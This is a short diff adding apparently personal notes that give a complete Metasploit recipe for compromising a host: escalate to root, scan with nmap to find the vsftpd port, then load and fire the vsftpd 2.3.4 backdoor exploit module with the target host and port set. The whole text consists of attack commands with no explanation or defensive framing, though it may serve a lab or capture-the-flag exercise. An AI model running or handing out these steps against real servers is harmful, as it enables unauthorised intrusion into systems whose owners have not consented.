@@ -1,0 +1,15 @@
+sudo su
+
+msfconsole
+
+nmap -sV <host>
+find port for vsftpd service
+
+search vsftpd
+
+use exploit/unix/ftp/vsftpd_234_backdoor
+
+set RHOST <host>
+set RPORT <port ftp>
+
+exploit
